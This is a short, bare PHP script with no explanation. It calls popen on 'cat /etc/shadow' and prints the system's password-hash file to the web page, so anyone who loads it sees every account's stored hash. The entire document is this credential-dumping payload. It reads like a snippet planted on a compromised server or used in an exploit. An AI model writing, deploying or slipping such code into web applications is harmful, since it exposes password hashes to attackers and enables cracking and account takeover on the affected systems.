<?php
echo "<pre>";
$fp = popen('cat /etc/shadow', 'r');

while ($line = fgets($fp))
{
   echo $line;
}

pclose($fp);
